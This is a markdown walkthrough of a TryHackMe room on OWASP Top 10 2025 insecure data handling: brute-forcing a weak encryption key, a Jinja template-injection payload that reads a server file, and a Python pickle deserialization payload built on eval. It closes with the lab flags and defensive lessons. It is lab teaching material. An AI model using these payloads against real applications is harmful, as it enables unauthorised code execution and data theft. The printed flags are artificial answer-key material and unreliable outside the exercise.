```markdown
# 🛡️ TryHackMe Walkthrough: OWASP Top 10 2025 – Insecure Data Handling

---

## 📖 Introduction
This TryHackMe room focuses on three categories from the **OWASP Top 10 2025** related to insecure data handling:

- 🔑 A04: Cryptographic Failures  
- 💉 A05: Injection  
- 📦 A08: Software/Data Integrity Failures

Each task demonstrates a real-world vulnerability with practical exploitation and flag capture.

---

## 🔑 Task 2: Cryptographic Failures (A04)

### 🔍 How to Find
- The application provides encrypted notes.
- Intercept the request using **Burp Suite** and identify the encryption mechanism.
- The key appears weak and predictable, suggesting brute-force is viable.

### 🛠️ Exploit
- Use Burp Suite Intruder to brute-force the key.
- The correct key is found to be `KEY1`.
- Decrypt the notes using this key to reveal the flag.

### 🎯 Flag
```
THM{WEAK_CRYPTO_FLAG}
```

### 📚 Lesson
Weak cryptographic keys make encryption ineffective. Always use strong algorithms and secure key management practices.

---

## 💉 Task 3: Injection (A05)

### 🔍 How to Find
- The web app accepts user input in a template field.
- Test with `{{7*7}}` to confirm SSTI (returns `49`).
- Goal: read `flag.txt` from the server.

### 🛠️ Exploit
Use this payload:
```jinja
{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
```

- This accesses Python’s built-in functions to read the file.
- The server returns the contents of `flag.txt`.

### 🎯 Flag
```
THM{SSTI_FLAG_OBTAINED}
```

### 📚 Lesson
SSTI allows attackers to execute arbitrary code. Always sanitize and validate user input in template engines.

---

## 📦 Task 4: Software/Data Integrity Failures (A08)

### 🔍 How to Find
- The app accepts serialized Python objects.
- It uses `pickle`, which is unsafe for untrusted data.
- Goal: craft a malicious payload to read `flag.txt`.

### 🛠️ Exploit
Use this Python code:
```python
import pickle, base64

class Malicious:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))

payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

- Submit the encoded payload to the application.
- The server executes the code and returns the flag.

### 🎯 Flag
```
THM{INSECURE_DESERIALIZATION}
```

### 📚 Lesson
Never deserialize untrusted data. Use safe formats like JSON or XML and validate integrity before processing.

---

## ✅ Final Flags Recap
- A04: `THM{WEAK_CRYPTO_FLAG}`  
- A05: `THM{SSTI_FLAG_OBTAINED}`  
- A08: `THM{INSECURE_DESERIALIZATION}`  

---

## ✨ Key Takeaways
- 🔐 Use strong cryptography and secure key storage.
- 🧼 Sanitize and validate all user inputs.
- 📦 Avoid insecure serialization formats like `pickle`.

This walkthrough demonstrates how insecure data handling can lead to serious vulnerabilities. It's a valuable exercise for bug bounty hunters, penetration testers, and developers alike.
```
